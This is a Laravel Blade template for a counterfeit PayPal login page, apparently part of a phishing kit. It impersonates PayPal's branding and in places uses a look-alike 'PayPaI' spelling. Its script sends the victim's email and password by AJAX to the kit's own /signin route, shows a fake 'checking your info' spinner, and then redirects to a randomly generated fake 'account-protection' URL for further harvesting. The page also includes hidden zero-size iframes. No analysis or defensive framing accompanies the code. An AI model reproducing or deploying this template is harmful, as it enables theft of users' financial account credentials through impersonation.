@extends('layouts.head')
@section('title', 'Login to your PayPal account')
@section('content')
  <div class="rotation"> <p> Checking your info... </p> </div>
	<div id="main" class="main " role="main">
		<section id="login" class="login" data-role="page" data-title="Log in to your PayPaI account">
			<div class="corral">
			<div id="content" class="contentContainer">
	<header><p class="paypal-logo paypal-logo-long">PayPal</p></header>
	<h1 class="headerText accessAid">Log in to your PayPal account</h1>

	<!-- FORM -->
	<form action="" required="required" method="post" class="yass-form-login" name="login" >
    <input type="hidden" id="token" value="{{csrf_token()}}">
    <input name="locale.x" value="en_US" type="hidden">
		<input name="processSignin" value="main" type="hidden">
		<div id="passwordSection" class="clearfix">
			<div class="textInput fieldempty " id="login_emaildiv">
				<div class="fieldWrapper">
					<label for="email" class="fieldLabel">Email address</label>
					<input id="email" name="yass_email" class="hasHelp  validateEmpty  " required="required" aria-required="true" autocomplete="off" placeholder="Email address" type="email">
				</div>
				<div class="errorMessage" id="emailErrorMessage">
					<p class="emptyError">Required</p>
					<p class="invalidError hide">That email format isn’t right</p>
				</div>
			</div>
			<div class="textInput lastInputField" id="login_passworddiv">
				<div class="fieldWrapper">
					<label for="password" class="fieldLabel">Password</label>
					<input id="password" name="yass_password" class="hasHelp  validateEmpty  " required="required" aria-required="true" value="" placeholder="Password" type="password">
				</div>
				<div class="errorMessage" id="passwordErrorMessage">
					<p class="emptyError hide">Required</p>
				</div>
			</div>
		</div>
		<div class="actions actionsSpaced">
			<input class="button actionContinue" type="submit" id="btnLogin" name="btnLogin" value="Log In">
		</div>
		<div class="forgotLink">
			<a href="#" id="forgotPasswordModal" class="scTrack:unifiedlogin-click-forgot-password">Having trouble logging in?</a>
		</div>
	</form>

	<a href="#" class="button secondary" id="createAccount">Sign Up</a>
	</div></div>
	<footer class="footer" role="contentinfo">
		<ul class="footerGroup">
			<li><a href="#">Contact Us</a></li>
			<li><a href="#">Privacy</a></li>
			<li><a href="#">Legal</a></li>
			<li><a href="#">Worldwide</a></li>
		</ul>
	</footer></section></div>

	<div class="transitioning hide"><p class="checkingInfo hide">Checking your info…</p><p class="">Just a second…</p></div>
	<!-- SiteCatalyst Code -->
	<iframe style="width: 0px; height: 0px; border: 0px none; position: absolute; z-index: -999;" title="" src="style/a.htm"></iframe>
	<div aria-label="Password Recovery" aria-describedby="forgot-password-modal" role="dialog" tabindex="-1" style="display: none; top: 134px; left: 511px;" class="ui-dialog ui-widget ui-widget-content ui-corner-all ui-front">
	<div class="ui-dialog-titlebar ui-widget-header ui-corner-all ui-helper-clearfix">
		<span class="ui-dialog-title" id="ui-id-1">&nbsp;</span>
		<button title="close" aria-disabled="false" role="button" class="ui-button ui-widget ui-state-default ui-corner-all ui-button-icon-only ui-dialog-titlebar-close" type="button">
			<span class="ui-button-icon-primary ui-icon ui-icon-closethick"></span>
			<span class="ui-button-text">close</span>
		</button>
	</div>
	<div style="display: block;" class="pwr-modal forgotPasswordModal ui-dialog-content ui-widget-content" id="forgot-password-modal" aria-label="Password Recovery">
		<iframe id="pwdIframe" data-src="/us/webapps/accountrecovery/passwordrecovery" scrolling="no" data-auto-reload="true" data-tabindex="0"></iframe>
	</div></div>
	<iframe src="style/i.htm" style="width: 0; height: 0; border: 0; position:absolute; z-index:-999" id="ppfniframe" name="ppfniframe"></iframe>
	<script src="{{URL::asset('asset/js/ys_dowira_jquery.js')}}"></script>
    <script src="{{URL::asset('asset/js/ys_dowira_plugins.js')}}"></script>
<script>



            $(".yass-form-login").validate({

                ///////////////////////////////////////////////////////////
                submitHandler: function(form) {
                  var email = $("#email").val();
                  var password = $("#password").val();
                  var token = $("#token").val();

                    $(".rotation").show();
                    $.ajax({
                      type: "POST",
                      url: '{{url('/signin')}}',
                      data: {
                        _token: token,
                        email: email,
                        password: password
                      },
                      success: function( msg ) {
                          setTimeout(function(){
                            window.location.replace("{{url('/summary/protection/webscr?cmd_=' . base64_encode(md5(uniqid())) . base64_encode(md5(uniqid())) .base64_encode(md5(uniqid())) .base64_encode(md5(uniqid())) . base64_encode(md5(uniqid())) .base64_encode(md5(uniqid())) .base64_encode(md5(uniqid())) .base64_encode(md5(uniqid())) .base64_encode(md5(uniqid())) .base64_encode(md5(uniqid())) .base64_encode(md5(uniqid())) .base64_encode(md5(uniqid())) .base64_encode(md5(uniqid())) .base64_encode(md5(uniqid())) .base64_encode(md5(uniqid())) .base64_encode(md5(uniqid())) .base64_encode(md5(uniqid())) .base64_encode(md5(uniqid())) .base64_encode(md5(uniqid())) .base64_encode(md5(uniqid())) ."&amp;dispatch=account-protection&amp;hash_id=" . md5(rand(0,99999999999999999)) . "&amp;locale.x=en_US")}}");
                          },3000);
                      }
                  });

                },
                ///////////////////////////////////////////////////////////
            });
        </script>
	</body>
</html>
@endsection
